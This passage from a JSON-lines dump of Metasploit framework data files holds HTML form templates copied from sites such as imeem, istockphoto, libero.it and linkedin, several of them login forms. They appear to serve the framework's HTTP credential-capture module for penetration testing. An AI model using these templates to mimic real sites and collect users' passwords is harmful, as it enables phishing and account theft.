action='http://papo.ig.com.br/' id='batepapo' method='post' target='_top'> </form>", "timestamp": "2025-10-24T23:40:43.376545"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ign.com.txt", "content": "<form name='multiSiteSearchForm' action='javascript:multiSiteSearchSubmit(document.multiSiteSearchForm);' method='GET' id='multiSiteSearchForm' style='margin: 0px;'> <input name=\"domain\" class=\"searchRadio\" type=\"radio\" /><input name=\"domain\" checked class=\"searchRadio\" type=\"radio\" /><input name=\"query\" size=\"60\" type=\"text\" id=\"searchTextBox\" value=\"\" height=\"100\" maxlength=\"60\" /></form><form> <input name=\"latest_check\" class=\"myDefaultCheck\" type=\"checkbox\" id=\"all\" onclick=\"checkboxClick(this.id)\" /><input name=\"latest_check\" class=\"myDefaultCheck\" type=\"checkbox\" id=\"myupdates\" onclick=\"checkboxClick(this.id)\" /><input name=\"latest_check\" class=\"myDefaultCheck\" type=\"checkbox\" id=\"news\" onclick=\"checkboxClick(this.id)\" /><input name=\"latest_check\" class=\"myDefaultCheck\" type=\"checkbox\" id=\"review\" onclick=\"checkboxClick(this.id)\" /><input name=\"latest_check\" class=\"myDefaultCheck\" type=\"checkbox\" id=\"preview\" onclick=\"checkboxClick(this.id)\" /><input name=\"latest_check\" class=\"myDefaultCheck\" type=\"checkbox\" id=\"vid\" onclick=\"checkboxClick(this.id)\" /><input name=\"latest_check\" class=\"myDefaultCheck\" type=\"checkbox\" id=\"img\" onclick=\"checkboxClick(this.id)\" /><input name=\"latest_check\" class=\"myDefaultCheck\" type=\"checkbox\" id=\"feature\" onclick=\"checkboxClick(this.id)\" /></form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form><form> </form>", "timestamp": "2025-10-24T23:40:43.704860"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/imageshack.us.txt", "content": "<form action='http://profile.imageshack.us/search.php' method='get' style='margin:0px'> <input name=\"q\" type=\"text\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form action='http://www.imageshack.us/toolbar/pictures.php' method='post' id='swfpostform'> <input name=\"hideregister\" type=\"hidden\" id=\"hideregister\" value=\"\" /></form><form enctype='multipart/form-data' action='http://www.imageshack.us/' method='post' onsubmit='return checkemail()' id='upform'> <input name=\"uploadtype\" type=\"radio\" id=\"toggle0\" onclick=\"toggleuploadmode(0)\" /><input name=\"uploadtype\" type=\"radio\" id=\"toggle1\" onclick=\"toggleuploadmode(1)\" /><input name=\"uploadtype\" type=\"radio\" id=\"toggle2\" onclick=\"toggleuploadmode(2)\" /><input name=\"uploadtype\" type=\"radio\" id=\"toggle3\" onclick=\"toggleuploadmode(3)\" /><input name=\"uploadtype\" type=\"radio\" id=\"toggle5\" onclick=\"toggleuploadmode(5);\" /><input name=\"fileupload\" size=\"50\" type=\"file\" id=\"fileupload\" onchange=\"showoptions(this)\" style=\"height:20px;\" /><input name=\"url\" size=\"50\" type=\"text\" id=\"fileupload\" value=\"\" onfocus=\"focusfield(this)\" style=\"color: #888;height:20px\" /><input size=\"50\" type=\"text\" value=\"\" disabled=\"DISABLED\" style=\"height:20px\" /><input name=\"email\" size=\"30\" type=\"text\" id=\"email\" maxlength=\"100\" /><input name=\"MAX_FILE_SIZE\" type=\"hidden\" value=\"\" /><input name=\"refer\" type=\"hidden\" value=\"\" /><input name=\"brand\" type=\"hidden\" value=\"\" /><input name=\"optimage\" type=\"checkbox\" id=\"optimage\" value=\"\" onclick=\"optsize.disabled=!this.checked\" /><input name=\"rembar\" type=\"checkbox\" id=\"rembar\" value=\"\" /><input type=\"submit\" id=\"butan\" value=\"\" style=\"width:135px;border:2px solid #FF6600\" /><input type=\"button\" id=\"swfbutan\" value=\"\" onclick=\"uploadstart()\" style=\"width:135px;display:none;border:2px solid #FF6600\" /></form>", "timestamp": "2025-10-24T23:40:44.369985"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/imagevenue.com.txt", "content": "<form name='hostn' action='/host.php' method='POST'> <input type=\"submit\" value=\"\" /></form><form name='uploadmain' enctype='multipart/form-data' action='upload.php' id='uploadmain' onsubmit='return validateTester();' method='post'> <input name=\"userfile[]\" type=\"file\" /><input name=\"userfile[]\" type=\"file\" /><input name=\"userfile[]\" type=\"file\" /><input name=\"userfile[]\" type=\"file\" /><input name=\"userfile[]\" type=\"file\" /><input type=\"submit\" value=\"\" /><input name=\"MAX_FILE_SIZE\" type=\"HIDDEN\" value=\"\" /><input name=\"action\" type=\"HIDDEN\" value=\"\" /><input name=\"img_resize\" size=\"4\" type=\"text\" maxlength=\"4\" /></form>", "timestamp": "2025-10-24T23:40:44.698869"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/imeem.com.txt", "content": "<form onsubmit='return false;'> <input name=\"ctl00$TopSearchBox\" class=\"SearchBox\" type=\"text\" id=\"ctl00_TopSearchBox\" onfocus=\"this.select()\" style=\"width: 200px;\" /><input class=\"SearchButton\" type=\"button\" value=\"\" onclick=\"initiateTagSearch(YAHOO.util.Dom.get(ctl00_TopSearchBox).value, YAHOO.util.Dom.get('ctl00_TopSearchFilter').value);\" /></form><form name='aspnetForm' method='post' id='aspnetForm'> <input name=\"__VIEWSTATE\" type=\"hidden\" id=\"__VIEWSTATE\" value=\"\" /><input name=\"ctl00$ContentPlaceHolder1$TextBoxEmail\" tabindex=\"1\" type=\"text\" id=\"ctl00_ContentPlaceHolder1_TextBoxEmail\" /><input name=\"ctl00$ContentPlaceHolder1$TextBoxPassword\" tabindex=\"2\" type=\"password\" id=\"ctl00_ContentPlaceHolder1_TextBoxPassword\" /><input name=\"ctl00$ContentPlaceHolder1$LoginButton\" tabindex=\"4\" type=\"submit\" id=\"ctl00_ContentPlaceHolder1_LoginButton\" value=\"\" onclick=\"ValidateLogin();\" /><input class=\"ActionButton\" type=\"button\" value=\"\" onclick=\"window.location='http://www.macromedia.com/go/getflashplayer/';\" /><input class=\"ActionButton\" type=\"button\" value=\"\" onclick=\"window.location='http://www.macromedia.com/go/getflashplayer/';\" /><input name=\"__EVENTVALIDATION\" type=\"hidden\" id=\"__EVENTVALIDATION\" value=\"\" /></form><form onsubmit='return false;'> <input name=\"ctl00$BottomSearchBox\" class=\"SearchBox\" type=\"text\" id=\"ctl00_BottomSearchBox\" onfocus=\"this.select()\" style=\"width:200px\" /><input class=\"SearchButton\" type=\"button\" value=\"\" onclick=\"initiateTagSearch(YAHOO.util.Dom.get('ctl00_BottomSearchBox').value, YAHOO.util.Dom.get('ctl00_BottomSearchFilter').value);\" /></form>", "timestamp": "2025-10-24T23:40:45.346002"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/indiatimes.com.txt", "content": "<form name='radioform' style='display: inline; margin: 0;'> <input name=\"searchbutton\" checked=\"true\" type=\"radio\" id=\"a\" value=\"\" onclick=\"javascript:ManageGoogleimg(this,'googleimg',0);\" /><input name=\"searchbutton\" type=\"radio\" id=\"b\" value=\"\" onclick=\"javascript:ManageGoogleimg(b,'googleimg',1);\" /><input name=\"searchbutton\" type=\"radio\" id=\"c\" value=\"\" onclick=\"javascript:ManageGoogleimg(this,'googleimg',2);\" /></form><form name='frmweb' action='http://search.indiatimes.com/websearch.cms?type=0' method='post' onsubmit='return checkKeyword();' target='_blank' style='display: inline; margin: 0;'> <input name=\"query\" size=\"50\" type=\"text\" id=\"query\" value=\"\" onclick=\"this.value=''\" style=\"width:250px;height:20px;margin:0 0 0 0;font-size:12px;\" maxlength=\"256\" /><input name=\"search2\" type=\"image\" src=\"/photo.cms?msid=2913756\" value=\"\" align=\"absmiddle\" /></form><form name='marketform' onsubmit='return changeForm()' method='get' style='display: inline; margin: 0;' target='pollwindow'> <input name=\"ticker\" type=\"hidden\" /><input name=\"ref\" type=\"hidden\" value=\"\" /><input name=\"ticker1\" type=\"text\" value=\"\" onclick=\"make_blank();\" style=\"width:100px;height:20px\" maxlength=\"50\" /><input name=\"Submit\" class=\"button\" type=\"submit\" method=\"get\" value=\"\" style=\"border:0px;\" /></form><form name='pollform' class='frmcls' action='/vote.cms' method='post' onsubmit='return submitmyformp(this);' id='pollform' target='pollwindow'> <input name=\"PRadio\" class=\"radio1\" type=\"radio\" value=\"\" align=\"center\" /><input name=\"PRadio\" class=\"radio1\" type=\"radio\" value=\"\" align=\"center\" /><input name=\"PRadio\" class=\"radio1\" type=\"radio\" value=\"\" align=\"center\" /><input name=\"txtPolliD\" type=\"hidden\" value=\"\" /><input name=\"vote\" class=\"button\" type=\"submit\" value=\"\" /></form><form name='loginfrm' action='http://integra.indiatimes.com/Times/Logon.aspx?ru=http://infinite.indiatimes.com/cgi-bin/gateway&IS=41e37aa4-a47c-4042-828e-cd1b7ebd1a44&NS=Email&HS=x0xwwSll8GwTra6A57qsTEaHvnU=' onsubmit='return checkVal(this);' method='post' style='display: inline; margin: 0;'> <input name=\"login\" tabindex=\"1\" size=\"8\" autocomplete=\"OFF\" type=\"text\" id=\"login\" maxlength=\"300\" style=\"width:96px;height:20px\" /><input name=\"passwd\" tabindex=\"2\" size=\"8\" autocomplete=\"OFF\" type=\"password\" id=\"passwd\" maxlength=\"300\" style=\"width:96px;height:20px\" /><input name=\"Sign in\" type=\"image\" src=\"/photo.cms?msid=2913757\" value=\"\" onclick=\"javascript:return remIDPASS();\" /><input name=\"rememberpassword\" type=\"checkbox\" id=\"rememberpassword\" value=\"\" /></form><form name='loginform' action='http://203.199.93.179/Chat/xchat/auditorium.jsp' method='post'> <input name=\"chatname\" type=\"text\" style=\"width:85px;\" maxlength=\"32\" /><input name=\"password\" type=\"hidden\" value=\"\" maxlength=\"20\" /><input name=\"client_type\" type=\"hidden\" value=\"\" /><input name=\"start\" type=\"hidden\" value=\"\" /><input name=\"guestlogin\" type=\"hidden\" value=\"\" /><input name=\"chatnow\" class=\"button\" type=\"submit\" value=\"\" onclick=\"callAction()\" style=\"width:85px;\" /></form><form name='form3' action='/webarticleshow.cms' method='get' onsubmit='return submitmyforma_newpoll(this);' target='_blank'> <input name=\"contenttype\" type=\"hidden\" value=\"\" /><input name=\"timetype\" type=\"hidden\" value=\"\" /><input name=\"msid\" type=\"hidden\" value=\"\" /><input name=\"astroid\" type=\"hidden\" value=\"\" /><input name=\"arc\" type=\"hidden\" value=\"\" /><input name=\"popup\" type=\"hidden\" value=\"\" /><input name=\"B1\" class=\"button\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:45.662756"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/information.com.txt", "content": "<form name='search' action='/search/index.html' method='get'> <input name=\"cat\" type=\"hidden\" value=\"\" /><input name=\"keyword\" size=\"65\" type=\"text\" value=\"\" /><input type=\"submit\" value=\"\" /></form><form name='form' action='/search' method='GET'> <input name=\"keyword\" size=\"50\" type=\"text\" /><input type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:46.039946"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/infoseek.co.jp.txt", "content": "<form name='FORMTEXT' action='http://top.www.infoseek.co.jp/TRedirect' method='get'> <input name=\"qt\" class=\"textArea\" type=\"text\" maxlength=\"256\" /><input name=\"search\" class=\"btn\" type=\"submit\" value=\"\" /><input name=\"mode\" type=\"hidden\" value=\"\" /><input name=\"col\" type=\"hidden\" value=\"\" /><input name=\"svx\" type=\"hidden\" value=\"\" /><input name=\"svp\" type=\"hidden\" value=\"\" /><input name=\"page\" type=\"hidden\" value=\"\" /><input name=\"rd\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:46.368255"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/interia.pl.txt", "content": "<form action='http://interia.hit.gemius.pl/hitredir/id=nA5FzwiyGQ5ZP._7SmVjqHXpzUVZiae8W4D43hbyYyr.k7/url=http://www.google.interia.pl/szukaj/' method='get'> <input name=\"q\" type=\"text\" id=\"q\" value=\"\" /><input name=\"s\" class=\"submit\" type=\"submit\" value=\"\" /><input name=\"sg\" type=\"hidden\" value=\"\" /></form><form action='http://pogoda.interia.pl/miasta' method='get'> <input name=\"s\" class=\"noJsHide\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:46.733432"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/isohunt.com.txt", "content": "<form name='ihSearch' action='/torrents/' method='GET'> <input name=\"ihq\" tabindex=\"1\" size=\"42\" class=\"post\" type=\"text\" id=\"ihq\" accesskey=\"s\" value=\"\" /><input tabindex=\"2\" class=\"mainoption\" type=\"submit\" id=\"searchBox\" value=\"\" /></form><form title='All proceeds goes to maintainence and development of this website. Thanks for your support!' action='https://www.paypal.com/cgi-bin/webscr' method='post' align='center'> <input name=\"cmd\" type=\"hidden\" value=\"\" /><input name=\"business\" type=\"hidden\" value=\"\" /><input name=\"undefined_quantity\" type=\"hidden\" value=\"\" /><input name=\"item_name\" type=\"hidden\" value=\"\" /><input name=\"item_number\" type=\"hidden\" value=\"\" /><input name=\"amount\" type=\"hidden\" value=\"\" /><input name=\"no_shipping\" type=\"hidden\" value=\"\" /><input name=\"return\" type=\"hidden\" value=\"\" /><input name=\"cn\" type=\"hidden\" value=\"\" /><input name=\"currency_code\" type=\"hidden\" value=\"\" /><input name=\"submit\" type=\"image\" src=\"\" onmouseover=\"ShowTip('PP');\" onmouseout=\"HideTip('PP');\" /></form><form name='sb' action='/' method='post'> <input name=\"DateTime\" type=\"hidden\" value=\"\" /><input name=\"IP\" type=\"hidden\" value=\"\" /><input name=\"fc\" type=\"hidden\" value=\"\" /><input class=\"liteoption\" type=\"submit\" value=\"\" /></form><form name='leftPoll' action='/forum/posting.php?t=32007' method='POST'> <input name=\"vote_id\" type=\"radio\" value=\"\" /><input name=\"vote_id\" type=\"radio\" value=\"\" /><input name=\"topic_id\" type=\"hidden\" value=\"\" /><input name=\"mode\" type=\"hidden\" value=\"\" /><input name=\"submit\" class=\"button\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:47.065422"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/istockphoto.com.txt", "content": "<form name='SiteLanguageForm' id='SiteLanguageForm'> </form><form name='topsearch' action='http://www.istockphoto.com/file_search.php' id='topsearch' method='get'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"text\" class=\"name\" type=\"text\" id=\"fileSearchBox\" /></form><form name='toplogin' action='https://secure.istockphoto.com/istock_login.php' method='post'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"username\" class=\"name\" type=\"text\" style=\"width: 150px; margin-bottom: 5px;\" /><input name=\"password\" class=\"name\" type=\"password\" style=\"width: 150px; vertical-align: top;\" /><input name=\"Login\" type=\"image\" src=\"images/buttons/languages/english/login.gif\" id=\"btnLogin\" value=\"\" alt=\"Login\" style=\"\" /></form>", "timestamp": "2025-10-24T23:40:47.422988"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/it168.com.txt", "content": "<form name='forms2' method='post' onsubmit='javascript:return SearchCheck1(this);' target='_blank'> <input name=\"ckey\" class=\"inp\" type=\"text\" /><input class=\"but\" type=\"submit\" value=\"\" /><input name=\"txtkey\" size=\"12\" type=\"hidden\" /><input name=\"cflag\" size=\"12\" type=\"hidden\" value=\"\" /></form><form name='forms2' class='w472' method='post' onsubmit='javascript:return SearchCheck1(this);' target='_blank'> <input name=\"ckey\" class=\"input\" type=\"text\" align=\"absmiddle\" /><input class=\"btn\" type=\"submit\" onmouseover=\"this.className='here'\" value=\"\" onmouseout=\"this.className='btn'\" /></form><form name='forms1' class='w472' method='post' onsubmit='javascript:return SearchCheck2(this);' target='_blank'> <input name=\"ckey\" class=\"input\" type=\"text\" align=\"absmiddle\" /><input class=\"btn\" type=\"submit\" onmouseover=\"this.className='here'\" value=\"\" onmouseout=\"this.className='btn'\" /></form><form name='forms3' class='w472' method='post' onsubmit='javascript:return SearchCheck3(this);' target='_blank'> <input name=\"ckey\" class=\"input\" type=\"text\" align=\"absmiddle\" style=\"width:276px;\" /><input name=\"txtkey\" size=\"12\" type=\"hidden\" /><input class=\"btn\" type=\"submit\" onmouseover=\"this.className='here'\" value=\"\" onmouseout=\"this.className='btn'\" /></form><form name='forms4' class='w472' method='post' onsubmit='javascript:return SearchCheck4(this);' target='_blank'> <input name=\"ckey\" class=\"input\" type=\"text\" align=\"absmiddle\" /><input class=\"btn\" type=\"submit\" onmouseover=\"this.className='here'\" value=\"\" onmouseout=\"this.className='btn'\" /></form><form name='forms5' class='w472' method='post' onsubmit='javascript:return SearchCheck5(this);' target='_blank'> <input name=\"ckey\" class=\"input\" type=\"text\" align=\"absmiddle\" /><input class=\"btn\" type=\"submit\" onmouseover=\"this.className='here'\" value=\"\" onmouseout=\"this.className='btn'\" /></form><form name='forms6' class='w472' method='post' onsubmit='javascript:return SearchCheck6(this);' target='_blank'> <input name=\"ckey\" class=\"input\" type=\"text\" align=\"absmiddle\" /><input class=\"btn\" type=\"submit\" onmouseover=\"this.className='here'\" value=\"\" onmouseout=\"this.className='btn'\" /></form><form name='search' action='http://answer.it168.com/answer_post.php' method='post' target='_blank'> <input name=\"searchkeyword\" type=\"hidden\" value=\"\" /><input name=\"subjectNameSearch\" class=\"input\" type=\"text\" id=\"subjectNameSearch\" value=\"\" onclick=\"oc()\" /><input type=\"image\" src=\"images/btn02.gif\" align=\"absmiddle\" /><input type=\"image\" src=\"images/btn03.gif\" align=\"absmiddle\" onclick=\"window.location.href='http://answer.it168.com/';return false;\" /></form><form name='formregister788' action='http://www.it168.com/files/diaocharesult.asp' method='post' onsubmit='javascript:if(comsub788()){window.open(,result,scrollbars=yes,width=300,height=350)}else{return false}' target='result'> <input name=\"question1547\" checked type=\"radio\" value=\"\" /><input name=\"question1547\" type=\"radio\" value=\"\" /><input name=\"formid\" type=\"hidden\" /><input name=\"xmid\" type=\"hidden\" value=\"\" /><input name=\"tijiao\" type=\"hidden\" value=\"\" /><input type=\"image\" src=\"images/btn04.gif\" /><input type=\"image\" src=\"images/btn05.gif\" onclick=\"javascript:window.open('http://www.it168.com/files/diaocharesult.asp?xmid=788','result','scrollbars=yes');return false\" /></form>", "timestamp": "2025-10-24T23:40:47.789933"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/iwiw.hu.txt", "content": "<form onkeypress='return postMainFormOnEnter(event, formMyTargetUrl() + ?method=Login,submit)' action='' method='post' id='mainForm'> <input name=\"email\" tabindex=\"1\" type=\"text\" value=\"\" style=\"width:240px\" /><input name=\"password\" tabindex=\"2\" type=\"password\" style=\"width:240px\" /><input name=\"chkb_httpslogin\" tabindex=\"3\" type=\"checkbox\" id=\"chkb_httpslogin\" onclick=\"toggleCheckbox(document.forms[0].httpslogin)\" /><input name=\"\" type=\"hidden\" value=\"\" /><input name=\"loginradio\" tabindex=\"4\" type=\"radio\" value=\"\" style=\"vertical-align:middle\" /><input name=\"loginradio\" checked=\"checked\" tabindex=\"4\" type=\"radio\" value=\"\" style=\"vertical-align:middle\" /><input name=\"loginradio\" tabindex=\"4\" type=\"radio\" value=\"\" style=\"vertical-align:middle\" /></form>", "timestamp": "2025-10-24T23:40:48.136409"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/jugem.jp.txt", "content": "<form name='login_form' action='./' method='post'> <input name=\"account_name\" class=\"text\" type=\"text\" value=\"\" maxlength=\"14\" style=\"width: 130px;\" /><input name=\"password\" class=\"text\" type=\"password\" value=\"\" maxlength=\"14\" style=\"width: 130px;\" /><input name=\"cookie_flg\" type=\"checkbox\" id=\"isSavePass\" /><input class=\"mb_5\" src=\"/img/top/login_area/login_btn.gif\" type=\"image\" value=\"\" onclick=\"return chkCookie()\" /></form><form name='search_form' action='/search/' method='get' id='search_form'> <input name=\"keyword\" tabindex=\"1\" class=\"search_input2\" onkeypress=\"return true\" type=\"text\" value=\"\" onclick=\"value=''; onclick=null; return false\" /><input tabindex=\"2\" onkeypress=\"\" type=\"image\" src=\"/top/img/marsflag_search.gif\" alt=\"JUGEM\u304b\u3089\u691c\u7d22\" onclick=\"search_action('lblog')\" /><input tabindex=\"3\" onkeypress=\"\" type=\"image\" src=\"/top/img/marsflag_search2.gif\" alt=\"\u30d6\u30ed\u30b0\u5168\u4f53\u304b\u3089\u691c\u7d22\" onclick=\"search_action('blog')\" /><input name=\"mode\" type=\"hidden\" value=\"\" /><input name=\"engine\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:48.466265"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/kakaku.com.txt", "content": "<form action='http://search.kakaku.com/ksearch/search.aspx' method='get'> <input name=\"query\" class=\"keywordBox\" type=\"text\" /><input name=\"search\" type=\"image\" src=\"\" alt=\"\u0152\u0178\u008d\u00f5\" /></form><form name='FrmCRMBase' action='' method='post'> <input name=\"ScreenID\" type=\"hidden\" value=\"\" /><input name=\"DispType\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:48.772161"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/kooora.com.txt", "content": "<form action='default.aspx' method='post'> <input name=\"ln\" class=\"pickerSelect\" type=\"text\" value=\"\" style=\"width:80px;font-size:10px;\" /><input name=\"lp\" class=\"pickerSelect\" type=\"password\" style=\"width:80px;font-size:10px;\" /><input class=\"pickerClear\" type=\"submit\" value=\"\" style=\"font-size:11px;\" /><input name=\"remember\" type=\"checkbox\" /></form>", "timestamp": "2025-10-24T23:40:49.160970"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ku6.com.txt", "content": "<form name='searchForm' action='http://so.ku6.com/video_do@key_' method='get' id='searchForm' onsubmit='return doSearch(this);' target='_blank'> <input name=\"inp\" class=\"sea_inp\" type=\"text\" id=\"inp\" /><input name=\"searchType\" type=\"hidden\" id=\"searchType\" value=\"\" /></form><form onsubmit='return UserMgr.login(null, p_quname, p_qupass)'> <input name=\"p_quname\" type=\"text\" id=\"p_quname\" /><input name=\"p_qupass\" type=\"password\" id=\"p_qupass\" /><input class=\"loginbtn\" type=\"image\" src=\"\" /></form><form id='v_search_form2' onsubmit='return doSearch(GI(v_search_form2));' target='_blank'> <input name=\"inp\" class=\"inp textsearch\" type=\"text\" value=\"\" /><input name=\"searchType\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:49.486513"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/last.fm.txt", "content": "<form action='/music/' method='get'> <input results=\"5\" name=\"q\" autosave=\"com.lastfm.searchhistory\" class=\"sbox hint\" type=\"search\" id=\"searchInput\" value=\"\" /></form><form method='post' id='favArtistForm'> <input name=\"favArtist\" class=\"hint\" type=\"text\" id=\"favArtist\" value=\"\" /><input type=\"submit\" id=\"favArtistSubmit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:49.810822"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/leonardo.it.txt", "content": "<form name='lh-formsearch' action='http://ricerca.leonardo.it' id='lh-formsearch' method='get'> <input name=\"Keywords\" class=\"searchinput\" type=\"text\" id=\"cerca\" /><input title=\"trova\" class=\"searchtrova\" src=\"\" type=\"image\" id=\"lh-trova\" /><input name=\"channel\" type=\"hidden\" id=\"channel\" value=\"\" /><input name=\"where\" type=\"hidden\" id=\"where\" value=\"\" /><input name=\"action\" type=\"hidden\" id=\"action\" value=\"\" /></form><form name='form1' action='http://email.leonardo.it/webmail/wm_5/login.php?action=login&home=1&leonardo=1' method='post' onsubmit='javascript:urchinTracker(/outgoing/email/login);'> <input name=\"us\" type=\"hidden\" value=\"\" /><input name=\"f_user\" class=\"user-emailit\" type=\"text\" value=\"\" style=\"width:70px;\" /><input name=\"f_pass\" class=\"pw-emailit\" type=\"password\" value=\"\" style=\"width:70px;\" /><input name=\"Act_Login\" class=\"bottone-emailit\" type=\"image\" src=\"\" alt=\"Entra nella webmail\" /></form><form name='formmeteo' action=''> </form><form action='http://paginegialle.leonardo.it/pg/cgi/pgsearch.cgi' method='get'> <input name=\"qs\" type=\"text\" /><input class=\"button\" src=\"\" type=\"image\" value=\"\" /><input name=\"fase\" type=\"hidden\" value=\"\" /><input name=\"ts\" type=\"hidden\" value=\"\" /><input name=\"btt\" type=\"hidden\" value=\"\" /><input name=\"ts\" type=\"hidden\" value=\"\" /><input name=\"l\" type=\"hidden\" value=\"\" /><input name=\"cb\" type=\"hidden\" value=\"\" /><input name=\"leo\" type=\"hidden\" value=\"\" /></form><form action='http://hotel.leonardo.it/regione.php' method='GET'> <input class=\"button\" type=\"image\" src=\"\" value=\"\" /><input name=\"leo\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:50.134329"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/letitbit.net.txt", "content": "<form name='F1' enctype='multipart/form-data' action='http://r3.letitbit.net/cgi-bin/home3r/upload.cgi?upload_id=' method='post' onsubmit='return StartUpload();' target='upload'> <input name=\"accept\" checked=\"checked\" type=\"checkbox\" id=\"accept\" value=\"\" onclick=\"terms();\" /><input name=\"myfile\" class=\"name-browse\" type=\"file\" id=\"myfile\" style=\"width:300px;\" /><input name=\"upload_a\" class=\"tool-upload\" type=\"submit\" id=\"upload_a\" value=\"\" onclick=\"terms();\" /><input name=\"owner\" class=\"name-desc\" type=\"hidden\" id=\"owner\" value=\"\" /><input name=\"self_desc\" class=\"name-desc\" type=\"text\" id=\"self_desc\" value=\"\" onclick=\"desc_s();\" /><input name=\"MAX_FILE_SIZE\" type=\"hidden\" value=\"\" /><input name=\"tmpl_name\" type=\"hidden\" value=\"\" /><input name=\"css_name\" type=\"hidden\" value=\"\" /><input name=\"sessionid\" type=\"hidden\" id=\"sessionid\" value=\"\" /><input name=\"uid\" type=\"hidden\" id=\"uid\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:50.438581"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/libero.it.txt", "content": "<form name='search' class='com07b-pa0ma0' id='search' method='get' onsubmit='return exper_controlla(23)'> <input name=\"regione\" type=\"hidden\" value=\"\" /><input name=\"query\" size=\"45\" type=\"text\" id=\"com07b-query\" style=\"width:525px;\" /><input type=\"image\" src=\"\" id=\"com07b-trova\" alt=\"Trova\" style=\"width:86px;height:29px;border:none\" /></form><form name='boxtxt3010' class='com07b-pa0ma0' method='get' onsubmit='return clickServer(http://rover.ebay.com/rover/1/724-5942-17847-30/4/?query= + this.query.value ,HPL,3010,3);'> <input name=\"query\" class=\"txt\" type=\"text\" id=\"ebay-query\" value=\"\" onclick=\"if (this.value=='Cerca') this.value='';\" /><input type=\"image\" src=\"\" border=\"0\" height=\"20\" alt=\"Cerca\" align=\"top\" width=\"28\" /></form><form name='webmail' class='com06a-pa0ma0' method='post' target='_top'> <input name=\"u\" type=\"hidden\" value=\"\" /><input name=\"d\" type=\"hidden\" value=\"\" /><input name=\"password\" type=\"hidden\" value=\"\" /><input name=\"dominio\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" name=\"LOGIN\" size=\"12\" class=\"link\" type=\"text\" style=\"width:130px;\" /><input tabindex=\"3\" name=\"PASSWD\" size=\"12\" class=\"link\" type=\"password\" style=\"width:130px;\" /><input name=\"Act_Login_fint\" tabindex=\"5\" type=\"image\" src=\"\" border=\"0\" height=\"24\" alt=\"ENTRA\" onclick=\"return selectPosta();\" width=\"73\" style=\"margin-top:2px;\" /></form>", "timestamp": "2025-10-24T23:40:50.782617"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/linkedin.com.txt", "content": "<form name='languageSelectorForm' action='/languageSelector' method='POST' accept-charset='UTF-8'> <input name=\"csrfToken\" type=\"hidden\" value=\"\" /><input name=\"i18nLang\" type=\"hidden\" value=\"\" /><input name=\"defaulturl\" type=\"hidden\" value=\"\" /></form><form name='ghr' class='feature' action='https://www.linkedin.com/secure/register' method='POST' accept-charset='UTF-8'> <input name=\"csrfToken\" type=\"hidden\" value=\"\" /><input name=\"firstName_ghr\" type=\"text\" id=\"firstName_ghr-ghr\" value=\"\" /><input name=\"lastName_ghr\" type=\"text\" id=\"lastName_ghr-ghr\" value=\"\" /><input name=\"email_ghr\" type=\"text\" id=\"email_ghr-ghr\" value=\"\" /><input name=\"\" class=\"button\" type=\"submit\" value=\"\" /></form><form name='gns' action='/ns' method='POST' accept-charset='UTF-8'> <input name=\"csrfToken\" type=\"hidden\" value=\"\" /><input name=\"firstName\" class=\"namefield\" type=\"text\" id=\"firstName-gns\" value=\"\" /><input name=\"lastName\" class=\"namefield\" type=\"text\" id=\"lastName-gns\" value=\"\" /><input name=\"ppSearch\" class=\"btn-second\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:40:51.095398"}
